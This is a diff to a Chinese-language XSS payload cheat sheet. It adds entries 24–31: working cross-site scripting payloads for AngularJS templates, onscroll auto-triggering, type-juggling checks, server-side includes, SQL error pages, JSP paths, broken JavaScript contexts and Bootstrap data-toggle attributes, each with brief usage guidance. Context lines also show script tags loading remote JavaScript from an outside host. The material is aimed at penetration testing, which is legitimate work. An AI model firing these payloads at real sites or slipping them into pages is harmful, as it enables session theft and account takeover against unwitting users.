@@ -141,16 +141,62 @@ payload在反射后的javascript代码中有结束脚本标签（</script>）时
 <script src=data:,alert(1)>
 <script src=//brutelogic.com.br/1.js>
 ```
-**22.Javascript postMessage() DOM Injection (with Iframe) (Javascript postMessage() DOM注入（带有Iframe）)**
+**22.Javascript postMessage() DOM Injection (with Iframe) (Javascript postMessage() DOM注入（带有Iframe）)** <br>
 在JavaScript代码中有"message"事件监听器(如"window.addEventListener('message',...)")时使用该payload，并且服务器端没有检查来源。 如果能够对目标进行请求伪造（根据http请求 X-Frame Options标头）。 则另存一个HTML文件（或者使用data:text/html，以提供TARGET_URL和INJECTION（xss payload）进行测试。<br>
 ```
 <iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
 ```
-**23.XML-Based XSS (基于XML的XSS)**
+**23.XML-Based XSS (基于XML的XSS)** <br>
 该payload用于在XML页面(内容类型为text/xml或application/xml）中进行测试。如果输入点位于注释部分，则在payload前添加"->"；如果输入位于CDATA部分，则将"->"添加payload。<br>
 ```
 <x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
 <x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
+```
+**24.AngularJS Injections (v1.6 and up) (AngularJS注入(v1.6及更高版本))。** <br>
+第一个payload用于在页面中，带有ng-app指令的HTML块中进行测试。<br>
+第二个payload用于创建自己的AngularJS库时使用。<br>
+```
+{{$new.constructor('alert(1)')()}}
+<x ng-app>{{$new.constructor('alert(1)')()}}
+```
+**25.Onscroll Universal Vector (通用Onscroll事件 测试payload)** <br>
+使用onscroll事件处理web应用时，用户无需交互即可触发XSS漏洞。它与address, blockquote, body, center, dir, div, dl, dt, form, li, menu, ol, p, pre, ul,和h1到h6 HTML标签一起使用。 <br>
+```
+<p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y
+```
+**26.Type Juggling (类型戏法)** <br>
+该payload用于在web应用不够严格对比匹配数字的"if"条件中使用。<br>
+```
+1<svg onload=alert(1)>
+1"><svg onload=alert(1)>
+```
+**27.XSS in SSI (SSI中的XSS漏洞)** <br>
+该payload在服务器端包含（SSI）注入时使用。<br>
+```
+<<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->>
+```
+**28.SQLi Error-Based XSS (基于sql显注的XSS)** <br>
+该payload在可以触发SQL错误消息（带引号或反斜杠）的功能点中进行测试。<br>
+```
+'1<svg onload=alert(1)>
+<svg onload=alert(1)>\
+```
+**29.Injection in JSP Path (JSP路径中的xss注入)** <br>
+该payload可以在基于JSP的程序，测试应用的路径中使用。<br>
+```
+//DOMAIN/PATH/;<svg onload=alert(1)>
+//DOMAIN/PATH/;"><svg onload=alert(1)>
+```
+**30.JS Injection - ReferenceError Fix (javascript注入-修复ReferenceError错误)** <br>
+该payload用于修复一些javascript代码的语法。 通过查看浏览器开发人员工具（F12）中的"控制台"选项卡，是否有相应的ReferenceError，并相应地替换变量和函数名称进行测试。<br>
+```
+';alert(1);var myObj='
+';alert(1);function myFunc(){}'
+```
+**31.Bootstrap Vector (up to v3.4.0) (Bootstrap最新版xss测试)** <br>
+该payload用于web应用调用bootstrap库时进行测试。 href值的任何char都可以进行HTML编码，只需单击页面中的任意位置即可触发，并且绕过Webkit Auditor过滤器。 <br>
+```
+<html data-toggle=tab href="<img src=x onerror=alert(1)>">
 ```
 
 ## 致谢
